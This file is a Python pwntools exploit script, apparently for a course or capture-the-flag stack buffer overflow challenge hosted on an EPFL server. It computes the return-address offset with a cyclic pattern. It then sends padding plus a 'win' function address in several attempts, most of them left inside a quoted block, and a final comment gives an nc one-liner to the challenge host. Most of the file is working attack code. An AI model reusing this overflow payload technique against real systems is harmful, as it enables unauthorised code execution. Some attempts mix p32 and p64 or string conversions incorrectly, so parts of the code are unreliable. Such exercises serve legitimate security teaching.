#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./exe_stack_bufov --host hexhive005.iccluster.epfl.ch --port 9001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe_stack_bufov')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'hexhive005.iccluster.epfl.ch'
port = int(args.PORT or 9001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def print_lines(io):
    info("printing io received lines")
    while True:
        try:
            print(io.recvline())
            # success(line.decode())
        except EOFError:
            break


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvline()

# For determining RIP offset

io.clean()
io.sendline(cyclic(200))
io.wait()
core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

'''

offset = 72

# padding = b"A" * offset
# payload = ""
# payload = "A"*offset
# payload += str(p64(0x4006c7))

# addr = p32(exe.symbols.win)

# addr = p32(0x4006c7)

# info("win addr is = %d", addr)

# payload = b"".join([padding, addr])

# ATTEMPT 1, a): send string rep, using p64

io.sendline('a'*offset + str(p64(0x4006c7)))

print_lines(io)

# ATTEMPT 1, b): send string rep, using p32

io = start()

io.recvline()

io.sendline('a'*offset + str(p64(0x4006c7)))

# ATTEMPT 2, a): send bin, using p64

io = start()

io.recvline()

io.sendline(b'a'*offset + p64(0x4006c7))

print_lines(io)


# ATTEMPT 2, b): send bin, using p32

offset = 72

io = start()

io.recvline()

# io.sendline(b'A'*offset + p32(0x4006c7))

io.sendline(b'A'*offset + p32(exe.symbols.win))

print_lines(io)

# io.interactive()

# ATTEMPT 3, a) also send bin, but constructed differently, using p64:

io = start()

io.recvline()

padding = b"A" * offset

addr = p64(0x4006c7)

payload = b"".join([padding, addr])

# ATTEMPT 3, b) also send bin, but constructed differently, using p32:

io = start()

io.recvline()

padding = b"A" * offset

addr = p32(0x4006c7)

payload = b"".join([padding, addr])

'''
# python -c "import struct; print 'A'*72 + struct.pack('<I', 0x4006c7)" | nc hexhive005.iccluster.epfl.ch 9001
